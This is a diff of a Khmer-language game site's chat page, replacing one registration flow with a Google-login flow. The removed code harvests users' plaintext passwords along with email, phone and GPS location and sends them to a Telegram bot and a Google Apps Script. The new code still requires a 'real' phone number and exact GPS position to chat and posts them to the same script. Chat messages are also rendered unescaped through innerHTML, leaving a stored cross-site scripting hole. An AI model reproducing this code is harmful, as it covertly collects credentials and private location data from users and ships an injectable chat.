@@ -2879,73 +2879,67 @@ body { padding-left: 240px !important; }
 
     </div>
             
-    <div id="chat-entry-gate" style="text-align: center; margin: 20px;">
-    <button onclick="showRegistration()" style="padding: 10px 20px; background: #8b4513; color: gold; border: 2px solid gold; cursor: pointer; border-radius: 5px; font-weight: bold;">ចូលលេងឆាត</button>
+    </div>
+    <div class="chat-container">
+    <div class="scroll-pillar pillar-left"></div>
+    <div class="scroll-pillar pillar-right"></div>
+
+    <div class="chat-title-wrapper">
+        <span class="bouncing-letter">💬</span> <span class="bouncing-letter">ប្រ</span><span class="bouncing-letter">អ</span><span class="bouncing-letter">ប់</span><span class="bouncing-letter">ឆា</span><span class="bouncing-letter">ត</span>
+    </div>
+         <div id="step-1" style="text-align: center; padding: 50px 0;">
+        <button onclick="toStep2()" style="background: #4CAF50; color: white; border: none; padding: 15px 35px; border-radius: 12px; font-size: 1.2rem; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">🚀 ចុចចូលលេងឆាត</button>
+    </div>
+    <div id="step-2" style="display: none; padding: 20px; background: white; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+    <h3 style="text-align: center; color: #d32f2f;">🔒 ផ្ទៀងផ្ទាត់គណនី Gmail</h3>
+    
+    <button onclick="loginWithGoogle()" style="width:100%; background:#db4437; color:white; border:none; padding:15px; border-radius:8px; cursor:pointer; font-weight:bold; margin-bottom:15px;">
+        🔴 ចុច Login ជាមួយ Gmail ពិតប្រាកដ ទើបអាចលេងបាន​សូមចុចពីលើបូតុងក្រហមយើងនេះ
+    </button>
+
+    <div style="text-align: left; margin-bottom: 10px;">
+        <label>👤 ឈ្មោះហៅក្រៅ៖</label>
+        <input type="text" id="reg-name" placeholder="វាយឈ្មោះរបស់អ្នក..." style="width:100%; padding:12px; margin-top:5px; border:1px solid #ccc; border-radius:8px;">
+    </div>
+
+    <div style="text-align: left; margin-bottom: 10px;">
+        <label>📞 លេខទូរស័ព្ទពិតប្រាកដ៖</label>
+        <input type="tel" id="reg-phone" 
+               placeholder="ឧទាហរណ៍៖ 012345678" 
+               oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+               maxlength="10"
+               style="width:100%; padding:12px; margin-top:5px; border:1px solid #ccc; border-radius:8px;">
+    </div>
+
+    <div style="text-align: left; margin-bottom: 15px;">
+        <label>📧 Gmail (ផ្ទៀងផ្ទាត់រួច)៖</label>
+        <input type="email" id="reg-email" placeholder="នឹងបង្ហាញក្រោយ Login រួចរាល់..." style="width:100%; padding:12px; margin-top:5px; border:1px solid #ddd; border-radius:8px; background: #f0f0f0;" readonly>
+    </div>
+    
+    <button onclick="getExactLocation()" id="btn-gps" style="width:100%; background:#2196F3; color:white; border:none; padding:12px; border-radius:8px; cursor:pointer; font-weight:bold;">📍 ចុចផ្តល់ទីតាំងពិត (GPS)</button>
+    <p id="gps-status" style="font-size: 0.8rem; color: red; text-align: center; margin-top: 8px;">*ចាំបាច់ត្រូវមានទីតាំង*</p>
+    
+    <button onclick="finalSubmit()" style="width:100%; background:#4CAF50; color:white; border:none; padding:15px; border-radius:8px; margin-top:15px; font-size: 1.1rem; font-weight:bold;">✅ យល់ព្រមចូលលេងឆាត</button>
 </div>
-
-<div id="registration-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; font-family: 'Khmer OS Battambang', sans-serif;">
-    <div style="background: #2c1a10; border: 3px solid gold; padding: 25px; border-radius: 15px; width: 320px; color: gold; box-shadow: 0 0 20px rgba(212, 175, 55, 0.5);">
-        <h3 style="text-align: center; margin-bottom: 15px; border-bottom: 1px solid gold; padding-bottom: 10px;">ចុះឈ្មោះចូលឆាត</h3>
         
-        <label>ឈ្មោះ:</label>
-        <input type="text" id="reg-name" class="reg-input" placeholder="បញ្ចូលឈ្មោះ..." style="width: 100%; margin-bottom: 10px; background: #3d2b1f; color: white; border: 1px solid #8b4513;">
+    <div id="step-3" style="display: none;">
+        <div id="chat-box" style="height: 350px; overflow-y: auto; background: white; padding: 10px; border-bottom: 1px solid #eee;"></div>
 
-        <label>អ៊ីមែល (Email):</label>
-        <input type="email" id="reg-email" class="reg-input" placeholder="example@gmail.com" style="width: 100%; margin-bottom: 10px; background: #3d2b1f; color: white; border: 1px solid #8b4513;">
+        <div class="chat-input-area">
+            <input type="text" id="chat-user-input" placeholder="ឈ្មោះ..." maxlength="12" readonly style="background: #f0f0f0;">
+            <label for="img-upload" style="font-size: 1.5rem; cursor: pointer;">🖼️</label>
+            <input type="file" id="img-upload" accept="image/*" style="display:none" onchange="sendChatImage(this)">
+            <input type="text" id="chat-msg-input" placeholder="ផ្ញើសារ..." maxlength="150" onkeypress="if(event.key==='Enter') sendChatMessage()">
+            <button class="btn-chat-send" onclick="sendChatMessage()">ផ្ញើ</button>
+        </div>
 
-        <label>លេខទូរស័ព្ទ:</label>
-        <input type="text" id="reg-phone" class="reg-input" placeholder="012345xxx" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10)" style="width: 100%; margin-bottom: 10px; background: #3d2b1f; color: white; border: 1px solid #8b4513;">
-
-        <label>លេខសម្ងាត់:</label>
-        <input type="password" id="reg-pass" class="reg-input" placeholder="Password" style="width: 100%; margin-bottom: 10px; background: #3d2b1f; color: white; border: 1px solid #8b4513;">
-
-        <label>ទីតាំង:</label>
-        <button onclick="getLocation()" id="btn-location" style="width: 100%; margin-bottom: 15px; background: #5d4037; color: white; border: 1px dotted gold; cursor: pointer;">📍 ចុចយកទីតាំងបច្ចុប្បន្ន</button>
-        <input type="hidden" id="reg-location">
-
-        <button onclick="validateAndJoin()" style="width: 100%; padding: 10px; background: gold; color: #2c1a10; border: none; font-weight: bold; cursor: pointer; border-radius: 5px;">បញ្ជាក់ការចូល</button>
+        <div style="text-align: left; margin-top: 10px;">
+            <span style="font-size: 0.8rem; color: gray;">Admin Code:</span>
+            <input type="password" id="admin-code" style="width: 80px; font-size: 0.7rem;">
+            <button class="btn-chat-send" style="background: #ff4d4d; margin-left: 5px;" onclick="clearAllChat()">លុបសារ</button>
+        </div>
     </div>
 </div>
-            
-<div class="chat-container">
-  
-<div class="scroll-pillar pillar-left"></div>
-    <div class="scroll-pillar pillar-right"></div>
-
-    <div class="chat-title-wrapper">
-
-        <span class="bouncing-letter">💬</span> <span class="bouncing-letter">ប្រ</span><span class="bouncing-letter">អ</span><span class="bouncing-letter">ប់</span><span class="bouncing-letter">ឆា</span><span class="bouncing-letter">ត</span>
-
-    </div>
-
-    <div id="chat-box"></div>
-
-    <div class="chat-input-area">
-
-        <input type="text" id="chat-user-input" placeholder="ឈ្មោះ..." maxlength="12">
-
-        <label for="img-upload" style="font-size: 1.5rem; cursor: pointer;">🖼️</label>
-
-        <input type="file" id="img-upload" accept="image/*" style="display:none" onchange="sendChatImage(this)">
-
-        <input type="text" id="chat-msg-input" placeholder="ផ្ញើសារ..." maxlength="150" onkeypress="if(event.key==='Enter') sendChatMessage()">
-
-        <button class="btn-chat-send" onclick="sendChatMessage()">ផ្ញើ</button>
-
-    </div>
-
-    <div style="text-align: left; margin-top: 10px;">
-
-        <span style="font-size: 0.8rem; color: gray;">Admin Code:</span>
-
-        <input type="password" id="admin-code" style="width: 80px; font-size: 0.7rem;">
-
-        <button class="btn-chat-send" style="background: var(--error-color); margin-left: 5px;" onclick="clearAllChat()">លុបសារ</button>
-
-    </div>
-
-</div>
-
 
 
 
@@ -3961,18 +3955,20 @@ speedStatus.innerHTML = `<img src="icon.png" width="30"> <span>${rankName}</span
         const fbUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}&quote=${encodeURIComponent(shareText)}`;
         window.open(fbUrl, 'facebook-share-dialog', 'width=626,height=436');
     }
+function sendChatMessage() {
+    const userInput = document.getElementById('chat-user-input');
+    const msgInput = document.getElementById('chat-msg-input');
+    const messageText = msgInput.value.trim();
 
-    function sendChatMessage() {
-        const userInput = document.getElementById('chat-user-input');
-        const msgInput = document.getElementById('chat-msg-input');
-        if (!msgInput.value.trim()) return;
+    if (messageText !== "") {
         chatRef.push({
-            name: userInput.value.trim() || "អ្នកលេង",
-            text: msgInput.value.trim(),
-            timestamp: firebase.database.ServerValue.TIMESTAMP
+            name: userInput.value || "អ្នកលេង", 
+            message: messageText,            
+            time: new Date().toLocaleTimeString() 
         });
-        msgInput.value = "";
+        msgInput.value = ""; 
     }
+}
 
     chatRef.limitToLast(15).on('value', (snap) => {
         const box = document.getElementById('chat-box');
@@ -4448,115 +4444,177 @@ function listenForAdminReplies() {
       });
 }
     
-window.onload = function() {
-        const savedUser = localStorage.getItem('chatUser');
-        if (savedUser) {
-            const user = JSON.parse(savedUser);
-            document.querySelector('.chat-container').style.display = 'block';
-            document.getElementById('chat-entry-gate').style.display = 'none';
-            document.getElementById('chat-user-input').value = user.name;
-            document.getElementById('chat-user-input').readOnly = true; 
-        }
-    };
 
-    function showRegistration() {
-        document.getElementById('registration-overlay').style.display = 'flex';
-    }
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwIvTUVDq1hG0NHnNNUMc7XGBGthCYJlYJYtlmX_dc5E7n62TysgoyJ9riS-iUypOq_A/exec";
+let finalMapLink = "";
+let userLat = "";
+let userLon = "";
 
-  
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const loc = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                document.getElementById('reg-location').value = loc;
-                document.getElementById('btn-location').innerText = "✅ បានយកទីតាំងរួចរាល់";
-                document.getElementById('btn-location').style.background = "#2e7d32";
-            }, function(error) {
-                alert("សូមបើក Location លើទូរស័ព្ទរបស់អ្នក!");
-            });
+
+firebase.auth().onAuthStateChanged((user) => {
+    if (user) {
+    
+        const savedName = localStorage.getItem('user_name');
+        if (savedName) {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+            document.getElementById('chat-user-input').value = savedName;
+            listenForMessages();
         }
     }
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwIvTUVDq1hG0NHnNNUMc7XGBGthCYJlYJYtlmX_dc5E7n62TysgoyJ9riS-iUypOq_A/exec";
+});
 
-
-function sendToTelegram(userData) {
-    const message = `
-🔔 **អ្នកចុះឈ្មោះថ្មី (New User)**
-━━━━━━━━━━━━━━━━
-👤 ឈ្មោះ: ${userData.name}
-📧 អ៊ីមែល: ${userData.email}
-📞 លេខទូរស័ព្ទ: ${userData.phone}
-🔑 លេខសម្ងាត់: ${userData.pass}
-📍 ទីតាំង: ${userData.location}
-━━━━━━━━━━━━━━━━`;
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    });
+function toStep2() {
+    document.getElementById('step-1').style.display = 'none';
+    document.getElementById('step-2').style.display = 'block';
+    setTimeout(initMap, 500); 
 }
-function validateAndJoin() {
+
+
+const provider = new firebase.auth.GoogleAuthProvider();
+
+
+function loginWithGoogle() {
+    firebase.auth().signInWithPopup(provider)
+        .then((result) => {
+            const user = result.user;
+            document.getElementById('reg-name').value = user.displayName;
+            document.getElementById('reg-email').value = user.email;
+            alert("Gmail ពិតត្រូវបានផ្ទៀងផ្ទាត់៖ " + user.email);
+        })
+        .catch((error) => {
+            alert("ការ Login បរាជ័យ! សូមព្យាយាមម្តងទៀត។");
+        });
+}
+
+function getExactLocation() {
+    const status = document.getElementById('gps-status');
+    status.innerText = "កំពុងស្វែងរកទីតាំងរបស់អ្នក...";
+    status.style.color = "orange";
+
+    if (!navigator.geolocation) {
+        alert("កម្មវិធីរុករករបស់អ្នកមិនគាំទ្រ GPS ទេ។");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            userLat = position.coords.latitude;
+            userLon = position.coords.longitude;
+     
+            finalMapLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
+            
+            status.innerText = "✅ ចាប់បានទីតាំងពិតប្រាកដហើយ!";
+            status.style.color = "green";
+            document.getElementById('btn-gps').style.background = "#4CAF50";
+            document.getElementById('btn-gps').innerText = "📍 ទីតាំងត្រូវបានកំណត់";
+        },
+        (error) => {
+            console.error(error);
+            alert("សូមបើក Location ឬ GPS លើទូរស័ព្ទរបស់អ្នកជាមុនសិន!");
+            status.innerText = "❌ បរាជ័យក្នុងការចាប់ទីតាំង";
+            status.style.color = "red";
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+}
+function finalSubmit() {
     const name = document.getElementById('reg-name').value.trim();
     const email = document.getElementById('reg-email').value.trim();
     const phone = document.getElementById('reg-phone').value.trim();
-    const pass = document.getElementById('reg-pass').value.trim();
-    const location = document.getElementById('reg-location').value;
+
+
+    if (!firebase.auth().currentUser) {
+        alert("❌ សូម Login ជាមួយ Gmail ជាមុនសិន!");
+        return;
+    }
+
+
+    if (!name) {
+        alert("❌ សូមបំពេញឈ្មោះរបស់អ្នក!");
+        return;
+    }
+
+  
+    const phonePattern = /^0[0-9]{8,9}$/;
+    if (!phone || !phonePattern.test(phone)) {
+        alert("❌ សូមបញ្ចូលលេខទូរស័ព្ទពិតប្រាកដ (ឧទាហរណ៍៖ 012345678)!");
+        return;
+    }
+
+  
+    if (!finalMapLink) {
+        alert("❌ សូមចុចផ្តល់ទីតាំង GPS ជាមុនសិន!");
+        return;
+    }
 
    
-    if (!name || !email || !phone || !pass || !location) {
-        alert("សូមបំពេញព័ត៌មានឱ្យគ្រប់ និងចុចយកទីតាំង!");
-        return;
-    }
-
-    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailPattern.test(email)) {
-        alert("អ៊ីមែលមិនត្រឹមត្រូវ!");
-        return;
-    }
-
-  យ
-    const userData = { 
-        name: name, 
-        email: email, 
-        phone: phone, 
-        pass: pass, 
-        location: location,
-        date: new Date().toLocaleString()
-    };
+    const btn = event.target;
+    const originalText = btn.innerText;
+    btn.innerText = "⏳ កំពុងដំណើរការ...";
+    btn.disabled = true;
 
   
     fetch(SCRIPT_URL, {
         method: 'POST',
-        mode: 'no-cors', 
+        mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(userData)
-    }).then(() => {
-        console.log("Data sent to Google Sheets");
+        body: JSON.stringify({
+            name: name,
+            email: email,
+            phone: phone,
+            location: finalMapLink
+        })
+    })
+    .then(() => {
+        localStorage.setItem('user_name', name);
+        document.getElementById('step-2').style.display = 'none';
+        document.getElementById('step-3').style.display = 'block';
+        if (typeof listenForMessages === "function") listenForMessages();
+    })
+    .catch(err => {
+        alert("មានបញ្ហាបច្ចេកទេស! សូមព្យាយាមម្ដងទៀត។");
+        console.error(err);
+    })
+    .finally(() => {
+        btn.innerText = originalText;
+        btn.disabled = false;
     });
-
-
-    sendToTelegram(userData);
-
-
-    localStorage.setItem('chatUser', JSON.stringify(userData));
-
-
-    document.getElementById('registration-overlay').style.display = 'none';
-    document.getElementById('chat-entry-gate').style.display = 'none';
-    document.querySelector('.chat-container').style.display = 'block';
-    
-   
-    const chatUserInput = document.getElementById('chat-user-input');
-    chatUserInput.value = name;
-    chatUserInput.readOnly = true;
-
-    alert("ជោគជ័យ! ទិន្នន័យត្រូវបានរក្សាទុក និងបញ្ជូនទៅកាន់ Admin។");
 }
+function listenForMessages() {
+    chatRef.limitToLast(30).on('value', (snapshot) => {
+        const chatBox = document.getElementById('chat-box');
+        chatBox.innerHTML = "";
+        snapshot.forEach((child) => {
+            const data = child.val();
+            chatBox.innerHTML += `<div style="margin-bottom:10px">
+                <span style="color:#d35400; font-weight:bold;">${data.name}:</span> 
+                <span>${data.message}</span>
+                <small style="color:#999; font-size:10px; display:block;">${data.time || ''}</small>
+            </div>`;
+        });
+        chatBox.scrollTop = chatBox.scrollHeight;
+    });
+}
+
+function initMap() {
+    if (document.getElementById('map')) {
+        let map = L.map('map').setView([11.5564, 104.9282], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        let marker = L.marker([11.5564, 104.9282], {draggable: true}).addTo(map);
+
+        marker.on('dragend', function(event) {
+            let position = marker.getLatLng();
+            userLat = position.lat;
+            userLon = position.lng;
+            finalMapLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
+            document.getElementById('gps-status').innerText = "✅ បានរើសទីតាំងរួចរាល់!";
+            document.getElementById('gps-status').style.color = "green";
+        });
+    }
+}
+
 
 
 let myCombatData = { id: null, name: "", avatar: "", lang: "kh", hp: 100 };
